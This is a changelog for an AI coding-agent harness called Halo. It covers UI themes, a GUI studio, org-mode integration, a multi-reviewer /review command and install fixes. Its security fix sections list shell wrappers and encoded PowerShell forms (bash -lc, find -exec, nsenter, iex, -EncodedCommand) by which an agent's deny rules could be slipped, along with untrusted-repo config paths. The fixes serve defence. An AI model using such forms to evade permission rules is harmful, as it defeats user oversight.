- Escape sequences inside tool output, model text, diffs and cards are shown as visible symbols instead of reaching the terminal; they can no longer retitle the window, write the clipboard or clear the screen. Pasted text is never altered, and typed SGR literals survive.
- A background task that fails (/doctor, /resume, /providers and the rest) shows an error notice instead of closing Halo. Esc interrupts a turn started from your phone. `!cmd` keeps pending image attachments.
- The Studio address stays on screen until replaced. Back from a Summary "Change:" step returns to the Summary. The model picker filters about 30 times faster on large catalogs. Picking a new model for a role keeps its escalation setting. Turning Org mode on or off no longer freezes the wizard while Paperclip is slow. The lineup editor reports a bad Instances value. /roles edit and /org edit refuse to open a file that exists but cannot be loaded.
- **Every game level** (all DOOM, Metroid, Mario, Beetlejuice and Alien variants) keeps the full ordinary status bar: model, context, cost and balance, mode, effort, agents, directory, phase, permission, jobs, remote, governor, offline and statusline. Only the colour changes, no setting or variant swaps the bar for panel boxes, and the level band draws no made-up counters. Pinned by a test over every theme and variant.

**Install, update and CI.**
- `halo update` works on the install the one-liner makes (a clone on a detached tag), and a tag-pinned checkout is treated as the stable channel; a plain `halo update` on the stable channel moves to the newest tag and checks that release's checksums asset. Four-part tags count as releases.
- Update reinstall commands keep the dependency versions pinned to requirements.lock; the installer and install docs no longer claim the lock's hashes are verified on install (CI does). The installers ask before running `uv tool update-shell` and accept `--no-modify-path` / `HALO_NO_MODIFY_PATH=1`.
- The proxy launch only rewrites ~/.claude/settings.json when its parsed content changed, keeping mode, symlink and formatting. A corrupt config.json prints one `halo: ...` line (exit 2) from every command. `halo preflight` canaries the lane a session would really start on. `/update` no longer re-sends the original prompt. `halo doctor` honours --cwd/--settings. `halo update` no longer refuses because an unrelated command mentions "halo". The release script's credential lookup cannot hang on a prompt.
- CI workflow: read-only token permissions, actions pinned to commit SHAs, every install from a hash-locked file.

**Design, Paperclip, redaction and the rest.**
- The Paperclip client goes through the same network helper as every other HTTP client (no token on cross-host redirects, offline mode honoured). A heartbeat with a very long issue description no longer crashes; the prompt travels on stdin. A design turn whose child hangs is killed at the turn timeout. `halo paperclip pull` writes back to the lineup it loaded.
- `halo design export --as folder` reruns into an existing folder; the exported index page escapes titles; `halo design sync` resolves stylesheet links correctly and no longer skips a folder whose own path contains `build` or `dist`; contrast checks judge WCAG on the true ratio.
- `halo export --sanitize` keeps object and list values under secret-named keys, and redacts `Cookie`, `Set-Cookie`, `Proxy-Authorization` and `Private-Token`. Bug reports collect secret values from lowercase and camelCase env keys.
- `halo work-matrix apply` treats a 429, 408, 5xx or timeout as "retry the probe", never as a permanent override. `--ax-screen-reader` answers approval requests. `/improve` counts a correction only on a whole cue word. The privacy scan honours the allowlist for machine-name terms. `halo gym propose --apply` leaves no temp directory behind.

### Org mode is a switch, off by default

- **Who orchestrates what, said plainly.** Your session (Roles) spawns agents
  when you type; Paperclip (Org) wakes them on heartbeats whether or not a
  session is open. `paperclip.enabled` is the switch and starts **off**: while
  off, `halo paperclip-run` answers every heartbeat idle, Studio's Org canvas
  explains the two orchestrators with a "Turn Org mode on" button, and `halo
  paperclip status` leads with the mode. On resumes the linked company's Halo
  agents; off pauses them (best effort). Four doors: `halo paperclip on|off`,
  `/org on|off`, the wizard's Organizations step, the **Org mode** button in
  Studio's header (`paperclip/mode.py`, `POST /api/pc/mode`).

### The levels, third generation, and two new themes

- **Sixteen pixels tall.** The band is eight rows now (`scene.ROWS`), with
  13-pixel heroes drawn in three tones so they read at a glance: the
  plumber's cap, moustache and gloves, the hunter's visor and pauldrons,
  the marine's helmet glare and shotgun. Six-frame strides with swinging
  arms, idle breathing, and a pose per state.
- **Things happen.** Ambient particles (`scene_model.Particle`: dust at
  the plumber's heels, embers rising through DOOM's floor, spores and drips
  in the cavern, steam from the corridor vents, sparks on the hillside),
  projectiles with gravity (the shell casing arcs back over the marine's
  shoulder), lamps that breathe (`Layer.flicker`), scenery that cycles
  (`Layer.animate`: the question block flashes, coins spin, panels blink),
  a helmet lamp (`Scene.hero_light`), a second enemy per scene (a shroom
  walker, a spiny crawler, a husk), and cue animations (`cues` are frame
  sequences now, rising by `cue_rise`: the mushroom pops out of a bumped
  block, the imp collapses). Everything stays a pure function of (phase,
  frame, scroll, cue, cue frame), so captures repeat byte for byte.
- **The level fights back** (`tui/scene_combat.py`; owner: "if the bad
  guy gets to the player, the player should die and then regenerate; when
  the player hits the bad guy 3-5 times it dies"). Every hero attacks while
  the model writes (Mario throws fireballs, the hunter's charge beam, the
  marine's shotgun pellets with the casing now a harmless eject, the
  trickster's conjured sparks, the flamethrower's longer reach); each
  projectile that reaches an enemy counts one hit, four bring it down
  (`Mover.hp`; its own `death` frames or the generic fall) and the next one
  walks in a few seconds later; an enemy that reaches the hero kills them
  (pop up, flip, fall through the floor) and they blink back, untouchable
  for a moment. The band steps the fight once per frame; a capture
  simulates it from a cold start, so every picture still repeats byte for
  byte.
- **Beetlejuice** (`/beetlejuice [house|saturn]`): a striped trickster on a
  haunted hillside under a dusk-purple sky, a giant sandworm surfacing
  while the model writes, a bat and a ball of green sparks while it thinks,
  a shrunken head on an error, a sign when it needs you; the afterlife
  desert as the second place.
- **Alien** (`/alien [nostromo|hive]`): an officer with a flamethrower in
  the ribbed corridor of a deep-space freighter, jets of flame lighting the
  ribs while the model writes, the creature stalking the corridor, the motion tracker pinging while it
  thinks, a facehugger on an error, a flashlight when it
  needs you; the hive as the second deck. Both are palettes
  (`tui/theme_games.py`), scenes (`tui/scene_beetlejuice.py`,
  `tui/scene_alien.py`), slash toggles and wizard choices like the other
  three, with the plain status bar tinted in their accent.

### Studio: connect boxes to boxes

- In Roles mode a member hung off the starting box and nothing else
  (the owner: "I want to be able to connect a new agent and role to
  something other than the starting agent / box"). Drag a card onto
  another card, or pick a box in the new **Reports to** field of the
  Assignment tab, and the member reports to that box: the lineup's
  `org.positions[].reports_to` (title = alias, else role, else agent),
  the edge moves with it, and dropping on the starting box hangs it off
  main again. The Org header (mode switch, Paperclip badge) no longer
  stays on screen in Roles or Design.

### The wizard hands roles and orgs to Studio

- **The Team step has a Custom roles switch** (off: one model for
  everything, the default) and an **Open Studio (Roles)** button; the
  Customize / New lineup / Agents buttons are gone (the terminal editors
  were "too bunched up" and overlapped their labels on Kali; Enter, Ctrl+E,
  Ctrl+N and Ctrl+A still reach them). The Orgs step gets **Open Studio
  (Org)**. Both buttons start Studio detached and print its URL.
- **One Studio per machine.** `halo studio` writes `~/.halo/studio.json`
  (pid, port, token; private) while it serves; a second `halo studio`
  reuses the running one, and `halo studio --stop` ends it
  (`studio/launch.py`).
- **Roles off still delegates.** The system prompt no longer calls
  sub-agents "not available in this build": it says the Agent tool spawns
  them, that with roles off every sub-agent runs the session model unless
  the call passes `model:`, and that big jobs are expected to hand surveys,
  searches, test runs and mechanical edits to a cheaper model. The Agent
  tool's description states the current roles state the same way.

### The game themes keep the plain status bar

- DOOM, Metroid and Mario no longer replace the status bar with their own
  panel rows (health, ammo, energy, coins, a timer); the bar is the
  ordinary one -- model, cost, context, mode, directory -- tinted in the
  theme's accent, so the information is never lost. Borders, the visor or
  pipe input frame and the level band stay. `HudSkin.status_bar` (`"plain"`
  for the shipped skins) and `hud.bar_skin_for` carry it.

### Subscription routes: off everywhere until accepted, now including the shipped lineups

- **Bios and lineups never run on a subscription route, accepted or not.**
  `subscription_scrub.py` rewrites `cc:`/`cx:` refs in the user and project
  `agents/` and `teams/` files to their OpenRouter equivalents (once per
  process when lineups are listed, and `halo subscriptions scrub` by hand),
  and `resolve_agent_bio` / `resolve_role_table` map any ref written later
  at resolve time, with a note. The owner's words: "it shouldn't occur
  regardless so people don't get banned."
- **No shipped bio or lineup names a `cc:`/`cx:` model any more.** Seven
  shipped bios and the `halo-dev-cycle` escalation target preferred
  `cc:claude-*`, so Roles mode in Studio and the wizard's lineup preview
  showed a Claude Code subscription model as the default pick before any
  acceptance (the role table fell through to the default model with a
  note, but the pick was on screen). They name the same models over
  OpenRouter now. `tests/test_subscription_defaults.py` pins it: shipped
  templates, the catalog, Studio's model list and every resolved shipped
  bio carry no subscription route while `halo subscriptions accept` has
  not been run.

### `halo update` says what it will do, not what you should type

- An up-to-date install prints one line (`already up to date -- <commit> is
  the newest on <channel>`) and nothing else. The reinstall command line
  (`git -C ... pull --ff-only && uv tool install ...`) read as an
  instruction, and its `&&` is not even PowerShell 5.1 syntax; it now
  appears only under `--check` when an update exists, prefixed
  `to apply: halo update  (it runs: ...)`. The headless `/update` report
  matches.

### Typing without stray text (Windows)

- **Mouse reports no longer type themselves into the prompt.** Textual's
  parser gives up on an escape sequence 100 ms after its last character,
  so a mouse report that straddled two reads of the console while the main
  thread was busy (the first seconds after launch) was fed as `ESC` and
  then its tail (`[<35;72;18M`, `8;17M`) as typed text, and a console whose
  input mode flipped mid-report handed over the tail alone. `tui/win32_input.py`
  installs a monitor with a stage between the console and the parser: an
  incomplete trailing sequence is held until the rest arrives (a real Esc
  still lands once the console goes quiet) and a batch that is nothing but
  report tails is dropped. Its record filter also stops skipping synthetic
  records while NumLock or CapsLock is on. The prompt strips any fragment
  that still lands, on its final `M`, and on paste (`widgets/input_sanitize.py`).
- **`Ctrl+U` clears the chat box**, and `Esc` clears it when nothing is
  running (it still interrupts a running turn). Both in `?` and the handbook.

### The levels, second generation

- **Twice the height, eight frames a second, 16-bit looks.** The level band is
  six rows (twelve pixel rows) instead of three, ticks at 8 fps while a turn is
  live, and every scene now has a sky gradient, three parallax layers (far,
  mid, ground speed), shaded sprites (a lowercase palette letter is the auto
  shadow of its uppercase), four-frame strides, projectiles, muzzle flashes and
  a lighting pass (`tui/scene_fx.py`: lamps, beams and flashes brighten the
  pixels around them). The engine (`tui/scene.py`, data in `scene_model.py`,
  text in `scene_text.py`) renders 200 columns in about 3 ms.
- **Three levels that play differently.** Mario: dusk sky, hills, clouds, bushes,
  pipes, a brick row, twinkling coins, a hop every couple of seconds, a flapping
  turtle, a `?` while thinking. Metroid: a cavern darkening to the floor, far
  walls, stalactites, glowing spores, charge-beam bolts that light the rock,
  a bobbing alien, lava that animates in Norfair, a sky and floor per area.
  DOOM: a hell-red floor glow, far arches, strobing lamps pooling light on the
  grating, a shotgun that fires every half second with a flash, recoil and a
  casing, an imp that throws fireballs with light trails.
- The band needs 32 rows now (was 30); the three level captures are six-frame
  animations.

### The GUI is one command away from every door

- **`/roles`, `/org`, `/design`** in the TUI open Halo Studio straight into that
  mode (Roles: lineups and bios as a graph; Org: the company in Paperclip;
  Design: artboards on your own apps). `/roles gui` and `/org gui` say the same
  anywhere, `... url` prints the URL only, `/roles table` is the text table and
  `/org list` the text list (what bare `/roles` and `/org` still print outside
  the TUI). `/studio [roles|org|design]` is the long form; `/design` is new.
- **`halo studio --mode roles|org|design`** opens the page in that mode; the URL
  carries `?mode=` ahead of the token and the page honours it over the mode it
  remembered (before, a remembered Org or Design mode won over `?mode=roles`).
- **Every model learns where the GUI is.** The system prompt's "How this
  harness works" section now names Halo Studio, its three modes and the command
  (a session on GLM 5.3 flash, asked to "open the gui for roles", ran `halo
  --help`, found no `studio` in it and opened Paperclip's own dashboard
  instead). `halo --help` lists studio, design, teams, agents and paperclip and
  ends with the GUI line; `halo roles|teams|agents --help` each end with a
  `GUI:` line.
- **Front page**: a `## Halo Studio` section with a three-mode banner
  (`docs/media/studio-modes.png`, `tools/studio_modes_banner.py`) and a
  mode table; the pitch names the GUI. tests/test_studio_modes.py.
- **CI**: the launch-scene marker follows the package version (the 3.0.1.0
  release run failed on `halo 2.`); `write_private_atomic` retries the final
  rename on Windows when a reader holds the file open.

## [3.0.1.0] - 2026-10-11

### Halo Design

- **Studio Design mode** (round D3): a third mode, `Roles | Org | Design`
  (`D`, `?mode=design`). A rail of projects, artboards and the design system;
  a pan/zoom canvas of frame cards (sandboxed iframe for HTML, image for a
  render, link card for PDF/MP4) with a device select, comment pins and a
  version slider; a panel with Chat (streamed turn events, cost, history),
  Comments (pins, Send comments), Knobs (a `css:--var` control rewrites the
  page's `:root` in place with no model call, `design/controls.py`), System,
  and Export plus the handoff bundle. Direct text edits through a
  contenteditable frame. Backend `studio/design_api*.py` (`/api/design/...`,
  one live turn per project polled every 500 ms) and the raw artboard route
  `/design-files/<slug>/<artboard>/<file>` with its own sandbox CSP.
  `tools/capture_studio.py --mode design` and `docs/media/studio-design.png`.
- **Which model for what** (round D1): catalog rows carry `modalities_in`,
  `modalities_out`, `image_output` and `tools` straight from the catalog
  (OpenRouter modalities and image pricing, the subscription `vision` flag,
  a local model's declared capabilities; absent stays unknown).
  `halo_harness/capabilities.py` turns them into profiles and rankings:
  `halo models --capabilities` and `halo models --best-for visual|audio|
  video|image|design`, each row with a score and a plain reason (vision,
  context, a price tier, speed, tool calls, the preflight canaries). Studio's
  model pickers show capability chips. docs/MODELS.md "Which model for what".
- **Plus more** (round D5): "3 directions" makes N variant artboards in one
  turn (`halo design run --variants N --base ID`); a **critique** turn
  (`halo design critique <slug> <artboard>`, a second model, Read-only tools,
  no MCP servers) posts its findings as comment pins with a severity; a
  WCAG **contrast** check (`design/contrast.py`, pure Python) pairs the
  page's text/accent tokens with its backgrounds and sits under the Knobs
  tab, refreshing after a knob moves; an **assets** rail with a drop zone
  (`design/assets.py`, upload + list, basenames only, 15 MB cap); the
  history shows tool calls, seconds and cost per turn; every Design command
  has a shortcut in the palette and the tour has Design steps.
  docs/media/studio-design-knob.png.
- **The design project and the design turn** (round D2): `halo_harness/design/`.
  A project is a folder under `~/.halo/design/<slug>/` (design.json, artboards
  with versions snapshotted only when files change, comments.json pins,
  controls.json knobs, system.json, history.jsonl, assets/). A turn is a real
  headless Halo run (`halo -p`, stream-json) in the project folder on the
  project's model with the file tools and the registered craft apps as its
  ONLY MCP servers (a strict `--mcp-config` written for the run) and the
  Design skill appended (the artboard contract, the recipe per app, the
  tokens, the open comments). `halo design new|list|show|run|sync|comment|
  restore|export|handoff|doctor`; `sync` reads CSS custom properties, a
  Tailwind config, tokens.json files and component names from a codebase or
  a page's stylesheets from a URL, with provenance; `export --as folder|html|
  png|svg|pdf` (a static site with an index page) and `handoff` (the bundle
  with HANDOFF.md a Halo or Claude Code session continues from). docs/DESIGN.md.
- **The craft apps, probed for real** (round D4): `design/crafts_probe.py`
  finds the seven ArtCraft servers (DesignCraft, VectorCraft, PhotoCraft,
  LightCraft, EffectCraft, FilmCraft, PdfCraft) in the session's own MCP
  config, and `halo design doctor --probe` spawns each through an ordinary
  manager handshake, counts its tools and checks the render tool (exit 1 when
  one is down or lacks it). `halo models --best-for design` is the model pick.

## [2.2.0] - 2026-10-11

### Org mode: Paperclip owns organizations

- **Halo as a Paperclip agent** (rounds C1-C2): `halo_harness/paperclip/`,
  a stdlib REST client for a Paperclip instance (board token from
  `~/.halo/paperclip.json`, or a heartbeat run's `PAPERCLIP_*` environment
  with the run id on every write) and `halo paperclip-run`, the command
  Paperclip's `process` adapter spawns: pick the run's issue (or the oldest
  open assigned one), check it out, build the prompt from the heartbeat
  context, run `halo -p` on the bio's model, post the reply as a comment and
  mark the issue done, or report the failure. Verified live against
  Paperclip 2026.1005.0.
- **Lineup -> company sync** (round C3): `halo paperclip sync <lineup>
  [--new NAME|--company X]` creates or updates one process agent per
  assignment with reporting lines from the lineup's `org.positions` or
  everyone -> main, idempotent through agent metadata; `halo paperclip pull`
  writes the company's lines back into the lineup; `status`, `install`,
  `open`, `link`, `org`. docs/PAPERCLIP.md.
- **Studio Org mode** (round C4): the Roles | Org toggle; the company's
  agents as cards with reports-to edges, drag-to-re-parent, an inspector
  that edits the agent, lists and creates issues, embeds the agent's own
  Paperclip page, and syncs a lineup into the company; Studio's server
  proxies `/api/pc/<path>` with the board token kept server-side and can run
  the install with its log streamed. `tests/test_paperclip.py`,
  `tests/test_studio_org.py` over `tests/helpers/fake_paperclip.py`;
  `docs/media/studio-org.png`.

## [2.1.0] - 2026-10-11

### Agents and roles, made clear

- **The Team step is back, and it explains itself** (round B1). A fresh
  `halo init` used to run Quick setup, which skipped the Team step and
  silently applied the `standard` lineup with roles off, so a new user never
  saw agents at all (and a later `--step team` opened with the switch off and
  both panes hidden). Quick setup is now `providers, default_model, team,
  summary`. The step is rebuilt: a plain-words header, a lineup list whose
  first row is "One model for everything" (applies `standard`, roles off)
  followed by every shipped, user and project lineup with a scope badge, and
  a live preview of the highlighted row -- the `role -> agent -> model` tree
  with price and context, the lineup's `about:` text, warnings, and one
  "Roughly $X per turn" line (or "price unknown for `<model>`", never a
  blank). Buttons: Use this lineup, Customize..., New lineup, Agents... (the
  bios list is no longer a pane). The "Custom roles: off / on" switch is
  gone; the step always writes `roles.enabled` explicitly. The Summary names
  the applied lineup with one line per role instead of applying `standard`
  itself. `halo_harness/tui/dialogs/team_preview.py` (`preview_lines`,
  `cost_hint`) is reusable by `halo teams preview` and `/teams`. Docs:
  `docs/WIZARD.md`, `docs/ROLES.md` and `docs/AGENTS.md` open with "The
  90-second version" and the new `docs/media/diagrams/agents-model.svg`;
  `docs/AGENTS.md` now lists all six shipped lineups and drops the
  120-column side-by-side claim. Tests: `tests/test_team_preview.py` and
  the updated wizard pilots.
- **One obvious command line for lineups** (round B2). `halo teams` with no
  arguments prints the active lineup (or "One model for everything"), its
  tree exactly as the wizard previews it, and one line per other lineup.
  `halo teams apply <name>` (and `use`) now writes `roles.*` AND `team:` and
  turns custom roles on -- the same config as the wizard (before, `use`
  wrote only `team:`); `apply standard` / `--one-model` turns roles off.
  New `halo teams preview <name>` and `halo teams diff <a> <b>`. `halo
  agents` with no arguments lists bios grouped by project / user / shipped
  with kind and model; `halo agents <name>` works as its usage line always
  promised. `halo roles` shows where each role's value came from (`[lineup
  <name>]`, `[legacy table]`, `[session default]`). The TUI and print mode
  get the same words: `/teams` (overview), `/teams apply|preview|diff`,
  and `/teams list` for the interactive screen. Error and notice strings in
  the three commands were reworded in plain language. New module
  `halo_harness/teams_cli_views.py`. Tests: `tests/test_agents_teams.py`
  (`test_b2_*`) and `tests/test_agents_teams_forms.py`.
- **Halo Studio** (round B3): `halo studio` (and `/studio`) serves a page from
  a loopback-only stdlib server (a per-launch token in the URL, an origin
  guard, a strict content-security policy, no CDN) that draws the active
  lineup as a graph: one card per assignment with the resolved model, price,
  context and tool count; delegation, reports-to and pipeline edges; drag,
  marquee, minimap, auto-layout and remembered positions. The inspector edits
  the assignment, the bio behind it (every section, typed fields, the "about
  N turns at this price" hint), the lineup's sections and the YAML both
  ways; Validate / Save / Apply go through `teams_yaml` and `agents_yaml`, a
  shipped file is duplicated into your scope on the first save. A command
  palette, a first-run tour, a run view over the newest session. docs/
  STUDIO.md, `tests/test_studio_api.py` / `test_studio_model.py` /
  `test_studio_ui.py` (headless Chrome), `docs/media/studio.png` from
  `tools/capture_studio.py`.

## [2.0.11] - 2026-10-11

### The front page

- **Every generated SVG has an explicit size** (round A1). Textual's export
  writes a `viewBox` only, and an SVG with no intrinsic size is laid out at
  the replaced-element default of about 300x150 px wherever it sits in an
  `<img>` -- GitHub's file view, the page a README click opens, showed every
  capture as a thumbnail. `scripts/screenshots.py::sized_svg` now adds
  `width`/`height` to every export (and the animation assembler to its root),
  all 24 capture SVGs are regenerated, and `tests/test_front_page_media.py`
  pins the attribute on every committed SVG so the bug cannot return.

- **The wordmark is block art under a halo** (round A2). `halo_harness/banner.py`
  holds `BANNER_ART`: six rows of block-letter HALO with box-drawing shadows
  under a three-row shaded ring, 41 columns wide, plus the old figlet form
  as `BANNER` for a stream that cannot encode block elements
  (`banner_for_encoding`). `halo --version` prints the art on a UTF-8
  stream; the launch intro reveals it row by row (about 140 ms a row, not a
  360-character crawl) with the ring in the palette's gold and the letters in
  an accent-to-user gradient (`intro_lines.banner_row_styles`, `IntroLine`'s
  new `row_styles`); `/intro 1` replays it the same way. The README's banner
  block and the hero carry the same rows. The intro pool is now exactly the
  art, the copy-of-a-copy line and the Red Dragon line (the three 2.0.3
  taglines are gone).
- **The hero and the social preview are generated** (`tools/hero_svg.py`):
  the art drawn as vector cells (never text, so no font can leave seams),
  a gold glow behind the ring, the model chips, the tagline;
  `docs/media/hero.svg` (1280x330) and `docs/media/social-preview.svg`
  (1280x640, the GitHub social-preview size). Both carry the art rows in
  their `<desc>`, and `tests/test_front_page_media.py` pins the hero to
  `banner.py` through them.

- **The game themes have a level** (round A3). A three-row band directly
  above the prompt draws an original 8-bit-style scene for the active game
  theme (`tui/scene.py`, the engine; `scene_mario.py`, `scene_metroid.py`,
  `scene_doom.py`, the art; `tui/widgets/scene_band.py`, the widget):
  Mario's plumber runs past warp pipes, brick rows and question blocks under
  drifting clouds while a winged turtle glides by; Metroid's hunter crosses a
  cavern of rock pillars and hatches (the ground is the area's own -- lava in
  Norfair, water in Maridia) while a floating alien drifts in and latches on
  at an error; DOOM's marine walks a tech base of steel pillars, barrels and a
  sealed door, the shotgun flashing while the model writes, an imp stalking in
  while it thinks. The hero runs and the scenery scrolls while the model
  writes; a finished sub-agent or job shows the scene's pickup beside the hero
  for two seconds (the HUD's own cue events). Half-block pixels on truecolor,
  plain characters otherwise; the sky is the theme's background. `/level`
  toggles it (`theme_scene` in config.json, on by default); the band yields on
  its own under 30 rows or 60 columns, while a pending card is docked, and
  under a theme without a scene. `tests/test_scene.py` pins the engine (every
  theme, phase, width, ASCII), the placement, the variants and the widget.
  Three animated front-page captures (`level-mario`, `level-metroid-norfair`,
  `level-doom`) join `tools/captures.json`.

- **The README reads like a product page** (round A4): a one-line pitch under
  the hero, real release and CI badges, a contents row, "What Halo is" with the
  three kinds of people it is built for, a GitHub warning callout that says
  plainly that the subscription routes may violate the provider's terms and
  are off until accepted, the stories with every screenshot linking to its
  full-size PNG, "The levels" with the three animated captures, the comparison
  table with agents and review rows, the features table led by routes and
  config reuse, a documentation table that includes SECURITY.md, and a
  contributing section. The GitHub description is one line and the topics
  name the models and the protocols; `docs/media/social-preview.png` (from
  `tools/hero_svg.py --social`) is the image for Settings -> Social preview.

## [2.0.10] - 2026-10-11

### Front page: real captures, diagrams, the stories

- **`tools/capture_screens.py` + `tools/captures.json`**: one deterministic
  capture list (name, scene, size 120x40, theme, 2x) rendered from the real TUI
  over mock data -- the phase line counting and collapsing to its summary, auto
  mode finishing a turn with no ask, a steer landing mid-turn, two queued asks in
  the pending dock, the model picker's price/context/speed columns, `/tasks` with
  a running organization tree, `/mcp` with a failure reason and two connectors,
  `/review` cards with a confirmed finding, the `/remote` dialog with a pending
  contact request, and the DOOM, Metroid (Norfair) and Mario HUDs. Each writes
  `docs/media/<name>.svg` (byte-identical on rerun) and, through headless Chrome
  when it is installed, a 2x `<name>.png`; the turn and the steer also get a
  hand-assembled looping SMIL `<name>.anim.svg`. No new Python dependency; the
  PNG step is skipped, SVGs kept, when Chrome is absent. The scenes live in
  `scripts/capture_scenes.py` and `scripts/capture_dialogs.py`, built on the
  existing pilot helpers of `scripts/screenshots.py` (whose scenes were factored
  into reusable `*_svg` functions; the older gallery output is unchanged).
- **Hand-drawn diagrams** under `docs/media/diagrams/` (each under 60 KB, on its
  own dark card so they read on a light or dark page): how a session runs, the
  routes, roles and organizations, the connectors bridge, and the remote-control
  path; plus a `docs/media/hero.svg` banner carrying the launch wordmark.
- **README, top half redone**: the hero, the pitch, the install block, then "What
  makes Halo stand out" as short stories with a picture each (auto mode, steering,
  watching a model think, the dock, one session across providers, roles and
  organizations, connectors, `halo bugreport`, `/review`, remote control, the game
  HUDs), a comparison table, then the gallery, features, themes and the rest.
  `tests/test_quickstart_docs.py` now pins the new section order.
- **Checks**: `tests/test_front_page_media.py` -- every README image exists and is
  under 1 MB, every PNG is a capture named in `captures.json`, every capture has
  its files, the diagrams stay under 60 KB, no real path or address is in any
  SVG, and `tools/capture_screens.py --check` (a fresh render compared byte for
  byte with the committed SVGs; PNGs are checked only for existence and size).
- **Docs**: [docs/MEDIA.md](docs/MEDIA.md) (the two commands, the Chrome
  requirement, what is and is not deterministic); the HANDBOOK links each
  diagram where it fits.

### /review: parallel dimension reviewers, a judge, an optional fix pass

- **`/review` and `halo review`** (`halo_harness/review/`, [docs/REVIEW.md](docs/REVIEW.md)),
  modelled on Claude Code's `/code-review`. `[target]` is nothing (the current
  branch against its merge base with the default branch, uncommitted and
  untracked changes included), a range `a..b`, a branch, a pull request
  (`#123` or `123`, through `gh pr diff` / `gh pr view --json`), or paths and
  globs reviewed as they are. Large diffs are split per file into shards.
- **Five read-only reviewers in parallel**, one sub-agent per dimension
  (`correctness`, `security`, `performance`, `tests`, `docs-consistency`) on the
  `reviewer` role, each with its own prompt under `review/prompts/`, run under
  `agents.max_concurrent` and visible in `/tasks`. Findings come back as JSON
  (`file, line, severity, category, short_summary, summary, failure_scenario`),
  parsed tolerantly (a fenced block anywhere in the reply) with one "output only
  the JSON array" repair. `--level low|medium|high` caps findings per reviewer
  at 3 / 8 / 20 and sets how speculative they may be; `--dimensions a,b`
  restricts.
- **A judge verifies every finding** (`judge` role): `CONFIRMED`, `PLAUSIBLE` or
  `DISMISSED` with a reason. Dismissed findings are dropped (kept in `--json`
  under `dismissed`), the rest are deduplicated (same file, line and category)
  and ranked severity-first, then verdict. `--no-verify` skips the judge.
- **`--fix`**: one `coder` sub-agent per CONFIRMED finding applies a minimal
  fix in the working tree (never committing), then the judge re-verifies the
  finding; each gets an `outcome` of `fixed`, `skipped` or `no_change_needed`.
- **Surfaces.** In the TUI: `/review ...` runs on a worker thread, the
  reviewers show in `/tasks`, and the result is a one-line header ("N findings
  (c confirmed, p plausible) from d reviewers in t s, $cost") plus one card per
  finding (clickable `file:line`, severity, verdict badge, failure scenario
  folded); Esc aborts every reviewer. In print mode: `halo review [target]`
  prints the same as text, or `--json` as `{target, findings[], dismissed[],
  reviewers[], cost_usd, elapsed_s}` in the ReportFindings field names;
  `--model`, `--role NAME=MODEL` and `--cwd` are accepted. `-p "/review ..."`
  prints the text form.
- **`code-review` team template** (`templates/teams/code-review.yaml`): maps the
  `reviewer`, `judge` and `coder` roles so the user can change which model does
  which part; it shows in the wizard's Team step, `/teams` and `halo teams`.
- Tests: `tests/test_review_target.py`, `test_review_findings.py`,
  `test_review_run.py`, `test_review_fix.py`, `test_review_cli.py`,
  `test_review_slash.py`, `test_review_tui.py` (scripted reviewer, judge and
  coder replies through the mock upstream; scratch git repos; a fake `gh`).

### Security review fix pass, round 1 (trust boundaries + credentials)

Findings 6-10 and 17-20 of [docs/harness/SECURITY-REVIEW-2.0.10.md](docs/harness/SECURITY-REVIEW-2.0.10.md).
Each is the trust gate the docs already promised, or a secret not leaking --
no new gates. Pins: `tests/test_security_round3.py`, `3b`, `3c`, `3d`.

- **6: a repo cannot approve its own `.mcp.json` servers.** `enableAllProjectMcpServers`
  and `enabledMcpjsonServers` are dropped from an untrusted project/local settings
  layer, and `-p` auto-approves `.mcp.json` servers only in a trusted folder (a hash
  approval or the user's own enabled list still approves).
- **7: a project `statusLine` does not run in an untrusted folder.** `statusLine`,
  `apiKeyHelper`, `awsAuthRefresh`, `awsCredentialExport`, `gcpAuthRefresh` and
  `otelHeadersHelper` join the keys an untrusted layer loses.
- **8: OAuth endpoints are checked.** Authorization and token endpoints (config or
  server metadata) must be `https`, or `http` on localhost, with no whitespace or
  control characters, before `webbrowser.open` or a token POST sees them. The token
  endpoint used at login is stored in the token file and used for every refresh, so
  a server that later changes its metadata never receives the refresh token.
- **9: `__` in a server name.** Such an entry is a disabled placeholder with a reason;
  `suggest_rule` keeps the whole tool name (`mcp__srv__do__thing`) and escapes a `*`
  in a command token.
- **10: the Databricks host from a project `team.json`.** It must be `https`; `halo init`
  and the wizard name the file and make you retype the host before a token is stored
  for it (`--yes` cannot confirm it); a `~/.halo/team.json` or `--team` host is used as before.
- **17: redaction.** `sanitize_node` redacts every string leaf as plain text before the
  JSON pass (pairs quoted inside tool results), URL credentials cover any `scheme://user:pass@`,
  values with backslashes are cut whole, `PIN=...` and numeric secret values go while token
  counts (`input_tokens: 12`) stay, JSON-escaped spellings of known secret values are replaced,
  header dicts (`{'Authorization': 'Bearer ...'}`) are caught, and `bridge.log`'s
  `RedactingFormatter` now runs the same redactor.
- **18: redirects.** When a redirect changes scheme, host or port, `urlopen_tls` forwards
  only plain transport headers (no `Authorization`, `x-api-key` or user headers).
- **19: stripped environment.** signal-cli (`run_cli`, `open_link`) gets
  `tool_child_env`; `.mcp.json` `${VAR}` expands from the stripped environment;
  `halo mcp list`/`get` show a remote url as scheme://host/path (no query).
- **20: secret files.** The proxy token, OAuth tokens, `config.json` and the imported env
  file are written through `write_private_atomic` (0600 from birth, no world-readable window);
  `add_allow_rule` keeps the settings file's mode; the proxy token is compared with
  `hmac.compare_digest`.

### Security review fix pass, round 2 (permission rules hold through compound commands; state-dir modes)

Findings 12-16 and 24-25 of [docs/harness/SECURITY-REVIEW-2.0.10.md](docs/harness/SECURITY-REVIEW-2.0.10.md);
11 is rejected (allow side, the standing contract). Deny and ask rules the user wrote now hold;
the allow side is unchanged and auto mode with no rules still allows. Pins:
`tests/test_security_round4.py`, `4b`, `4c`.

- **11: rejected.** An explicit allow rule matches exactly as before; allow matching is not
  changed and no "dangerous command" heuristic is added.
- **12: compound forms and wrappers.** A deny or ask rule fires through `if/then`, `for/do`,
  `while`, `until`, `!`, `exec`, `case` arms, `watch`, `flock`, `unshare`, `chroot`, `strace`,
  `fakeroot`, `nsenter`, `taskset`, `chrt`, `runuser` and siblings, `flock -c '...'` and
  `find -exec`. `bash -lc` and a script fed to `sh` ask when a Bash rule exists. PowerShell
  script blocks, the call operator and `powershell -Command` / `cmd /c` payloads reach the
  rule, and `iex` / `-EncodedCommand` ask when a PowerShell rule exists.
- **13: tool-global options.** `git -C x push`, `docker --context x run`, `kubectl -n x delete`,
  `npm --prefix x publish` and the same shape for `cargo`, `helm`, `terraform`, `make`, `aws` and
  more match the user's prefix rule.
